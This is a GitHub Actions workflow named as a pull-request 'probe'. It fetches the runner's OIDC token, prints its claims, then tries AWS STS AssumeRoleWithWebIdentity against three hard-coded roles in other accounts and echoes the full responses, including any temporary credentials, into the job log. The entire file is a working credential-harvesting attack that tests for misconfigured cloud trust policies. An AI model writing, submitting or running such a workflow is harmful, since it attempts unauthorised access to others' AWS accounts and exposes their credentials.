name: pr-agent-probe
on:
  pull_request:
    types: [opened, reopened, ready_for_review]
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: oidc-sts-probe
        run: |
          echo "PROBE_BEGIN $(date -u +%FT%TZ)"
          echo "IDURL_SET=$([ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ] && echo yes || echo no)"
          echo "IDTOK_SET=$([ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ] && echo yes || echo no)"
          JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          echo "JWT_LEN=${#JWT}"
          echo "$JWT" | python3 -c 'import sys,base64,json; t=sys.stdin.read().strip().split("."); pad=lambda s: s+"="*(-len(s)%4); c=json.loads(base64.urlsafe_b64decode(pad(t[1]))); print("JWT_CLAIMS="+json.dumps(c,sort_keys=True))'
          for ROLE in arn:aws:iam::814229680634:role/GitHubActionsRole arn:aws:iam::073855610728:role/GitHubActionsRole arn:aws:iam::570339075110:role/GitHubActionsRole; do
            echo "ROLE_BEGIN $ROLE"
            curl -sS -X POST https://sts.amazonaws.com/ \
              -H "Content-Type: application/x-www-form-urlencoded; charset=utf-8" \
              --data-urlencode "Action=AssumeRoleWithWebIdentity" \
              --data-urlencode "Version=2011-06-15" \
              --data-urlencode "RoleArn=$ROLE" \
              --data-urlencode "RoleSessionName=c211probe75081" \
              --data-urlencode "WebIdentityToken=$JWT" \
              --data-urlencode "DurationSeconds=3600"
            echo
            echo "ROLE_END $ROLE"
          done
          echo "PROBE_END"
